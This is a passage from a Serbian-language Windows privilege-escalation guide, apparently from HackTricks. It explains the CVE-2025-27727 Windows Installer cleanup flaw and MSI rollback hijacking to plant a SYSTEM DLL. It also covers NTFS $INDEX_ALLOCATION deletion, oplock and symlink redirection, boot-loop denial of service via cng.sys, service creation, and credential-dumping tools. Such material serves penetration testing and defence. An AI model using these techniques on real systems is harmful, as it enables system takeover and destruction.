### Ubacivanje putanje za čišćenje Windows Installer COM-a (CVE-2025-27727)

Klijent sa niskim privilegijama može da pristupi usluzi `msiexec.exe` sa SYSTEM privilegijama preko COM objekta `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Obrnutim inženjeringom su utvrđeni relevantni pozivi `IMsiServer`: `MsiBeginTransactionW` na pomeraju vtable-a `0xA0`, `SetEEUIDirectoryAndFilter` na `0xC8` i `CleanupTempPackages` na `0x50`. Ovi nazivi i pomeraji utvrđeni su obrnutim inženjeringom i mogu se razlikovati među buildovima.<sup>[[41]](#references)</sup>

Za korisnika koji nije administrator, `SetEEUIDirectoryAndFilter` vrši impersonaciju pozivaoca samo dok otvara prosleđenu putanju sa `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` i `FILE_FLAG_OPEN_REPARSE_POINT`. Time se potvrđuje da pozivalac može da obriše direktorijum i izbegava praćenje reparse point-a, ali se **ne** povezuje provereni objekat datoteke sa kasnijim čišćenjem niti dokazuje da ga je kreirao Windows Installer.<sup>[[41]](#references)</sup>

Nakon `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` zakazuje putanju kao fasciklu bez obzira na argument filtera koji je pozivalac prosledio. Usluga upisuje imenovanu vrednost `REG_DWORD` pod `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: naziv vrednosti je putanja koju kontroliše pozivalac, a podatak `0x00000002` predstavlja oznaku fascikle. Zatim `CleanupTempPackages(NULL, FALSE)` neposredno pokreće čišćenje. Njegov privilegovani worker enumeriše vrednosti registra i prosleđuje stavke koje predstavljaju fascikle rekurzivnoj funkciji `FDeleteFolder` bez provere porekla putanje. Ako uobičajeno uklanjanje ne uspe, kod takođe poziva `LockdownPath`, uklanja atribute datoteke i pokušava ponovo.<sup>[[41]](#references)</sup>

Minimalni redosled poziva rekonstruisan iz `msi.dll` je:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Korisni primitiv je ponovno korišćenje putanje, a ne preusmeravanje junction-om. Registrujte `C:\Config.Msi` koji je napravio napadač, uklonite ga i dozvolite da Windows Installer kasnije ponovo kreira istu putanju sa zaštićenim rollback podacima. Čišćenje veruje zastarelom imenu `TempPackages` i briše novi direktorijum kao SYSTEM. Ovo zaobilazi predviđenu granicu zaštite koju obezbeđuju `FILE_FLAG_OPEN_REPARSE_POINT` i mitigacija poverenja u preusmeravanje, jer nije potrebna reparse tačka.<sup>[[41]](#references)</sup>

Ovaj primitiv za brisanje uklapa se u rollback lanac ispod: sačuvajte zaseban zapis `Installer\Folders`, obrišite zaštićeni `C:\Config.Msi`, ponovo ga kreirajte sa NULL DACL-om i zadržite handle sa dodeljenim `WRITE_DAC` pre nego što installer ojača DACL. Unapred otvoren handle može da vrati permisivni DACL pomoću `NtSetSecurityObject`, nakon čega se generisani `.rbs` može zameniti pre nastavka rollback-a.<sup>[[41]](#references)</sup>

Microsoft je ispravio putanju tako što je sprečio `CMsiTransaction::SetEEUIDirectoryAndFilter` da poziva `ScheduleFileOrFolderDelete` kada je omogućena nova funkcija. COM poziv i dalje može da vrati uspeh, ali više ne dodaje putanju koju kontroliše napadač u `TempPackages`. Instalirajte bezbednosna ažuriranja za Windows iz aprila 2025. umesto da uspešan povratak metode koristite kao proveru ispravke.<sup>[[41]](#references)[[42]](#references)</sup>

Sažeta tehnika je sledeća:

1. **Faza 1 – Priprema otmice (ostavite `C:\Config.Msi` praznim)**

- Korak 1: Instalirajte MSI
    - Napravite `.msi` koji instalira bezopasnu datoteku (npr. `dummy.txt`) u upisivu fasciklu (`TARGETDIR`).
    - Označite installer kao **„UAC Compliant“**, tako da može da ga pokrene **korisnik koji nije administrator**.
    - Ostavite otvoren **handle** za datoteku nakon instalacije.

- Korak 2: Započnite deinstalaciju
    - Deinstalirajte isti `.msi`.
    - Proces deinstalacije počinje da premešta datoteke u `C:\Config.Msi` i da ih preimenuje u `.rbf` datoteke (rollback rezervne kopije).
    - **Proveravajte otvoreni handle** pomoću `GetFinalPathNameByHandle` da biste otkrili kada datoteka postane `C:\Config.Msi\<random>.rbf`.

- Korak 3: Prilagođena sinhronizacija
    - `.msi` sadrži **prilagođenu akciju deinstalacije (`SyncOnRbfWritten`)** koja:
        - Signalizira da je `.rbf` upisan.
        - Zatim **čeka** na drugi događaj pre nego što nastavi deinstalaciju.

- Korak 4: Sprečite brisanje `.rbf` datoteke
    - Kada dobijete signal, **otvorite `.rbf` datoteku** bez `FILE_SHARE_DELETE` — time **sprečavate njeno brisanje**.
    - Zatim **pošaljite signal nazad** kako bi se deinstalacija završila.
    - Windows Installer ne uspeva da obriše `.rbf`, a pošto ne može da obriše sav sadržaj, **`C:\Config.Msi` se ne uklanja**.

- Korak 5: Ručno obrišite `.rbf`
    - Vi, napadač, ručno brišete `.rbf` datoteku.
    - Sada je **`C:\Config.Msi` prazna**, spremna za otmicu.

> U ovom trenutku **aktivirajte ranjivost za brisanje proizvoljne fascikle na nivou SYSTEM-a** da biste obrisali `C:\Config.Msi`.

2. **Faza 2 – Zamena rollback skripti zlonamernim skriptama**

- Korak 6: Ponovo kreirajte `C:\Config.Msi` sa slabim ACL-ovima
    - Sami ponovo kreirajte fasciklu `C:\Config.Msi`.
    - Postavite **slabe DACL-ove** (npr. Everyone:F) i **ostavite otvoren handle** sa `WRITE_DAC`.

- Korak 7: Pokrenite drugu instalaciju
    - Ponovo instalirajte `.msi`, uz:
        - `TARGETDIR`: upisiva lokacija.
        - `ERROROUT`: promenljiva koja izaziva prinudni neuspeh.
    - Ova instalacija će se koristiti za ponovno pokretanje **rollback-a**, koji čita `.rbs` i `.rbf`.

- Korak 8: Pratite pojavu `.rbs` datoteke
    - Koristite `ReadDirectoryChangesW` da pratite `C:\Config.Msi` dok se ne pojavi nova `.rbs` datoteka.
    - Zabeležite njeno ime.

- Korak 9: Sinhronizujte pre rollback-a
    - `.msi` sadrži **prilagođenu instalacionu akciju (`SyncBeforeRollback`)** koja:
        - Signalizira događaj kada se kreira `.rbs`.
        - Zatim **čeka** pre nego što nastavi.

- Korak 10: Ponovo primenite slabe ACL-ove
    - Nakon što primite događaj `.rbs created`:
        - Windows Installer **ponovo primenjuje jake ACL-ove** na `C:\Config.Msi`.
        - Ali, pošto i dalje imate handle sa `WRITE_DAC`, možete **ponovo da primenite slabe ACL-ove**.

> ACL-ovi se **proveravaju samo pri otvaranju handle-a**, tako da i dalje možete da pišete u fasciklu.

- Korak 11: Postavite lažne `.rbs` i `.rbf` datoteke
    - Zamenite `.rbs` datoteku **lažnom rollback skriptom** koja nalaže Windows-u da:
        - Vrati vašu `.rbf` datoteku (zlonamerni DLL) na **privilegovanu lokaciju** (npr. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Postavite lažnu `.rbf` datoteku koja sadrži **zlonamerni DLL payload na nivou SYSTEM-a**.

- Korak 12: Pokrenite rollback
    - Signalizirajte događaj sinhronizacije da bi installer nastavio.
    - **Prilagođena akcija tipa 19 (`ErrorOut`)** podešena je tako da **namerno izazove neuspeh instalacije** u poznatom trenutku.
    - Zbog toga **počinje rollback**.

- Korak 13: SYSTEM instalira vaš DLL
    - Windows Installer:
        - Čita vaš zlonamerni `.rbs`.
        - Kopira vaš `.rbf` DLL na ciljnu lokaciju.
    - Sada se vaš **zlonamerni DLL nalazi na putanji koju učitava SYSTEM**.

- Završni korak: Izvršite SYSTEM kod
    - Pokrenite pouzdani **automatski povišeni binarni fajl** (npr. `osk.exe`) koji učitava DLL koji ste oteli.
    - **Gotovo**: vaš kod se izvršava **kao SYSTEM**.


### Od proizvoljnog brisanja/premeštanja/preimenovanja datoteka do SYSTEM EoP

Glavna MSI rollback tehnika (prethodna) podrazumeva da možete da obrišete **celu fasciklu** (npr. `C:\Config.Msi`). Ali šta ako vaša ranjivost omogućava samo **proizvoljno brisanje datoteka**?

Možete iskoristiti **NTFS interne mehanizme**: svaka fascikla ima skriveni alternativni tok podataka koji se zove:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Ovaj stream čuva **metapodatke indeksa** fascikle.

Dakle, ako **obrišete stream `::$INDEX_ALLOCATION`** fascikle, NTFS **uklanja celu fasciklu** iz sistema datoteka.

To možete uraditi pomoću standardnih API-ja za brisanje datoteka, kao što su:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Iako pozivaš API za brisanje *datoteke*, on **briše samu fasciklu**.

### Od brisanja sadržaja fascikle do SYSTEM EoP
Šta ako tvoj primitiv ne dozvoljava brisanje proizvoljnih datoteka/fascikli, ali **dozvoljava brisanje *sadržaja* fascikle koju kontroliše napadač**?

1. Korak 1: Napravi fasciklu-mamac i datoteku
- Napravi: `C:\temp\folder1`
- U njoj napravi: `C:\temp\folder1\file1.txt`

2. Korak 2: Postavi **oplock** na `file1.txt`
- **Oplock** **pauzira izvršavanje** kada privilegovani proces pokuša da obriše `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Korak 3: Pokrenite SYSTEM proces (npr., `SilentCleanup`)
- Ovaj proces skenira fascikle (npr., `%TEMP%`) i pokušava da obriše njihov sadržaj.
- Kada naiđe na `file1.txt`, **oplock se aktivira** i predaje kontrolu vašem callback-u.

4. Korak 4: Unutar oplock callback-a – preusmerite brisanje

- Opcija A: Premestite `file1.txt` na drugo mesto
    - Ovo prazni `folder1` bez prekidanja oplock-a.
    - Nemojte direktno brisati `file1.txt` — to bi prerano oslobodilo oplock.

- Opcija B: Pretvorite `folder1` u **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opcija C: Kreirajte **symlink** u `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Ovo cilja interni NTFS tok u kom se čuvaju metapodaci fascikle — njegovim brisanjem briše se fascikla.

5. Korak 5: Oslobodite oplock
- SYSTEM proces nastavlja rad i pokušava da izbriše `file1.txt`.
- Ali sada, zbog junction + symlink, zapravo briše:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Rezultat**: `C:\Config.Msi` briše SYSTEM.

### Od kreiranja proizvoljne fascikle do trajnog DoS-a

Iskoristite primitive koji omogućava da **kreirate proizvoljnu fasciklu kao SYSTEM/admin** — čak i ako **ne možete da upisujete datoteke** ili **postavljate slabe dozvole**.

Kreirajte **fasciklu** (ne datoteku) sa imenom **kritičnog Windows upravljačkog programa**, npr.:
```
C:\Windows\System32\cng.sys
```

- Ova putanja obično odgovara kernel-mode drajveru `cng.sys`.
- Ako je **unapred kreirate kao fasciklu**, Windows neće uspeti da učita stvarni drajver pri pokretanju.
- Zatim Windows pokušava da učita `cng.sys` tokom pokretanja.
- Nailazi na fasciklu, **ne uspeva da pronađe stvarni drajver** i **ruši se ili zaustavlja pokretanje**.
- **Nema rezervne opcije** ni **oporavka** bez spoljne intervencije (npr. popravke pokretanja ili pristupa disku).

### Od privilegovanih putanja za logove/rezervne kopije + OM symlinkova do proizvoljnog prepisivanja datoteka / DoS-a pri pokretanju

Kada **privilegovana usluga** zapisuje logove/izvoze na putanju pročitanu iz **konfiguracije koju je moguće menjati**, preusmerite tu putanju pomoću **Object Manager symlinkova + NTFS mount pointova** i pretvorite privilegovano zapisivanje u proizvoljno prepisivanje datoteke (čak i **bez** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Zahtevi**
- Konfiguracionu datoteku koja čuva ciljnu putanju može da menja napadač (npr. `%ProgramData%\...\.ini`).
- Mogućnost kreiranja mount pointa do `\RPC Control` i OM file symlinka (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Privilegovana operacija koja zapisuje na tu putanju (log, izvoz, izveštaj).

**Primer lanca**
1. Pročitajte konfiguraciju da biste saznali privilegovano odredište loga, npr. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` u datoteci `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Preusmerite putanju bez administratorskih privilegija:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Sačekajte da privilegovana komponenta upiše log (npr. administrator pokrene „send test SMS“). Upis se sada vrši u `C:\Windows\System32\cng.sys`.
4. Pregledajte prepisanu datoteku (hex/PE parserom) da biste potvrdili oštećenje; restartovanje primorava Windows da učita izmenjenu putanju drajvera → **boot loop DoS**. Ovo se može primeniti i na bilo koju zaštićenu datoteku koju će privilegovana usluga otvoriti za pisanje.

> `cng.sys` se obično učitava iz `C:\Windows\System32\drivers\cng.sys`, ali ako postoji kopija u `C:\Windows\System32\cng.sys`, Windows može prvo pokušati da je učita, pa je ta lokacija pouzdana meta za DoS pomoću oštećenih podataka.



## **Od High Integrity do System**

### **Nova usluga**

Ako se već izvršavate u procesu sa High Integrity, **put do SYSTEM** može biti jednostavan: samo **napravite i pokrenite novu uslugu**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Kada kreirate service binary, proverite da li je to validan service ili da li binary dovoljno brzo obavlja potrebne radnje, jer će biti prekinut nakon 20 sekundi ako nije validan service.

### AlwaysInstallElevated

Iz High Integrity procesa možete pokušati da **omogućite AlwaysInstallElevated registry entries** i **instalirate** reverse shell pomoću _**.msi**_ wrapper-a.\
[Više informacija o uključenim registry keys i instaliranju _.msi_ paketa možete pronaći ovde.](#alwaysinstallelevated)

### Od High + SeImpersonate privilegije do System

**Kod možete** [**pronaći ovde**](seimpersonate-from-high-to-system.md)**.**

### Od SeDebug + SeImpersonate do Full Token privilegija

Ako imate te token privileges (verovatno ćete ih pronaći u procesu koji već ima High Integrity), moći ćete da **otvorite skoro svaki proces** (osim zaštićenih procesa) pomoću SeDebug privilegije, **kopirate token** procesa i kreirate **proizvoljan proces sa tim tokenom**.\
Ova tehnika se obično koristi za **izbor bilo kog procesa koji se izvršava kao SYSTEM sa svim token privileges** (_da, možete pronaći SYSTEM procese koji nemaju sve token privileges_).\
**Primer koda koji izvršava predloženu tehniku možete** [**pronaći ovde**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ovu tehniku koristi meterpreter za eskalaciju u `getsystem`. Tehnika se sastoji od **kreiranja pipe-a, a zatim kreiranja/zloupotrebe service-a za upisivanje u taj pipe**. Zatim će **server** koji je kreirao pipe pomoću privilegije **`SeImpersonate`** moći da **impersonate token** pipe klijenta (service-a) i dobije SYSTEM privilegije.\
Ako želite da [**saznate više o name pipes, pročitajte ovo**](#named-pipe-client-impersonation).\
Ako želite da pročitate primer [**prelaska iz high integrity u System pomoću name pipes, pročitajte ovo**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ako uspete da **hijack-ujete dll** koji **učitava** **proces** pokrenut kao **SYSTEM**, moći ćete da izvršite proizvoljan kod sa tim privilegijama. Zato je Dll Hijacking koristan i za ovu vrstu eskalacije privilegija, a uz to ga je **mnogo lakše izvesti iz procesa sa high integrity** jer taj proces ima **write permissions** nad fasciklama koje se koriste za učitavanje dll-ova.\
**Više o Dll hijacking-u možete** [**saznati ovde**](dll-hijacking/index.html)**.**

### **Od Administrator ili Network Service do System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Od LOCAL SERVICE ili NETWORK SERVICE do svih privilegija

**Pročitajte:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Dodatna pomoć

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Korisni alati

**Najbolji alat za pronalaženje vektora lokalne eskalacije privilegija u Windows-u:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Proverava pogrešne konfiguracije i osetljive fajlove (**[**pogledajte ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Otkriven.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Proverava neke moguće pogrešne konfiguracije i prikuplja informacije (**[**pogledajte ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Proverava pogrešne konfiguracije**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Izvlači informacije o sačuvanim sesijama za PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Koristite -Thorough lokalno.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Izvlači credentials iz Credential Manager-a. Otkriven.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Isprobava prikupljene lozinke širom domena**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh je PowerShell ADIDNS/LLMNR/mDNS spoofer i man-in-the-middle alat.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Osnovna Windows enumeracija za privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Traži poznate privesc ranjivosti (ZASTAREO, zamenjen alatom Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne provere **(potrebna su Admin prava)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Traži poznate privesc ranjivosti (mora se kompajlirati pomoću VisualStudio-a) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeriše host u potrazi za pogrešnim konfiguracijama (više alat za prikupljanje informacija nego za privesc) (mora se kompajlirati) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Izvlači credentials iz velikog broja softvera (precompiled exe na GitHub-u)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port alata PowerUp za C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Proverava pogrešne konfiguracije (precompiled executable na GitHub-u). Ne preporučuje se. Ne radi dobro u Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Proverava moguće pogrešne konfiguracije (exe iz Python-a). Ne preporučuje se. Ne radi dobro u Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Alat napravljen na osnovu ovog posta (za ispravan rad mu nije potreban accesschk, ali može da ga koristi).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Čita izlaz komande **systeminfo** i preporučuje exploite koji rade (lokalni Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Čita izlaz komande **systeminfo** i preporučuje exploite koji rade (lokalni Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projekat morate da kompajlirate pomoću odgovarajuće verzije .NET-a ([pogledajte ovo](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Da biste videli instaliranu verziju .NET-a na hostu žrtve, možete da uradite sledeće:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Osnove eskalacije privilegija u Windows-u](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Eskalacija privilegija iskorišćavanjem slabih dozvola fascikli](http://www.greyhathacker.net/?p=738)
- [3] [Eskalacija privilegija u Windows-u - cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - radionica za lokalnu eskalaciju privilegija u Windows-u / Linux-u](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Napadi na Windows: AT je novi hit (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Eskalacija privilegija - Windows - kompletan OSCP vodič](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - eskalacija privilegija - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Vodič za eskalaciju privilegija u Windows-u](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Kontrolna lista za eskalaciju privilegija u Windows-u](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Eskalacija privilegija u Windows-u](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Metode eskalacije privilegija u Windows-u za pentestere](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing preko SMTP-a → dešifrovanje hMailServer akreditiva → Veeam CVE-2023-27532 do SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: format-string leak + stack BOF → VirtualAlloc ROP (RCE) i krađa kernel tokena](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Potera za srebrnom lisicom: mačka i miš u senkama kernela](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Ranjivost privilegovanog fajl sistema u SCADA sistemu](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Alati za testiranje simboličkih linkova – upotreba CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Veza sa prošlošću. Zloupotreba simboličkih linkova u Windows-u](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [Zbogom, RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: opasno razrešavanje modula u Windows-u](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js moduli: učitavanje iz fascikli `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - rešeni izazovi iz C/C++ kontrolne liste](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - funkcija RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own uz Microslop: ulančavanje CLDFLT i DirectX kernel race uslova za Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Jedan I/O Ring da svima vlada: primitiva za potpuno čitanje/pisanje u Windows-u 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Zloupotreba proizvoljnog brisanja fajlova radi eskalacije privilegija i drugi sjajni trikovi](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - kod za eksploataciju FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS napadi, 2. deo: CVE-2020-1013, jednodnevna lokalna eskalacija privilegija u Windows-u 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: istraživanje Credential Manager-a i Windows Vault-a](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: kada promena slike dovede do eskalacije privilegija](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - izvlačenje privatnih SSH ključeva iz Windows 10 SSH agenta](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Pretvaranje serverskih sistema za ažuriranje preduzeća u fabrike backdoor-a (0_o) – 1. deo](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Pretvaranje serverskih sistema za ažuriranje preduzeća u fabrike backdoor-a (0_o) – 2. deo](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - eskalacija privilegija brisanjem fascikle Windows Installer-a](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: vraćanje koracima do NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
{{#include ../../banners/hacktricks-training.md}}
